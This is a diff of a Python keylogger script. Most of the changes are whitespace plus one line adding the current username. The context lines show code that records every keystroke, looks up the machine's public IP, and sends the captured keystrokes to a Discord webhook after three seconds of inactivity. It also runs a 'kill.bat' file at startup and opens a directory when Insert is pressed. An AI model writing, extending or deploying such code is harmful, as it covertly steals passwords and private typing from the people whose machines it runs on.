@@ -26,6 +26,7 @@ special_keys = {
     keyboard.Key.esc: " ESC ",
 }
 
+username = os.getlogin()
 def run_bat_file():
     """Run the kill.bat file when the script starts."""
     bat_file_path = rf"C:\users\{username}\kl2.1\kill.bat"  # Update the path to your kill.bat file
@@ -34,6 +35,7 @@ def run_bat_file():
         print(f"Successfully ran {bat_file_path}")
     except subprocess.CalledProcessError as e:
         print(f"Error running {bat_file_path}: {e}")
+
 
 def get_public_ip():
     """Fetch the public IP address using an external API."""
@@ -47,6 +49,7 @@ def get_public_ip():
         print(f"Error getting public IP address: {e}")
         return "Unknown"
 
+
 def send_to_webhook(message):
     """Send the message to the Discord webhook."""
     payload = {"content": message}
@@ -59,6 +62,7 @@ def send_to_webhook(message):
     except Exception as e:
         print(f"Error sending message to webhook: {e}")
 
+
 def keystroke_monitor():
     """Monitor keystrokes and send them after 3 seconds of inactivity."""
     global keystrokes, last_keypress_time
@@ -69,16 +73,18 @@ def keystroke_monitor():
                 send_to_webhook(keystrokes)
                 keystrokes = ""
 
+
 def on_press(key):
     global keystrokes, last_keypress_time
     try:
         key_str = key.char
     except AttributeError:
         key_str = special_keys.get(key, f"[{key}]")
-    
+
     with lock:
         keystrokes += key_str
         last_keypress_time = time.time()
+
 
 def on_release(key):
     if key == keyboard.Key.insert:
@@ -87,6 +93,7 @@ def on_release(key):
         subprocess.run(["explorer", file_path])
         send_to_webhook(f"Opened dir...")
         return False
+
 
 # Run kill.bat file at the start
 run_bat_file()
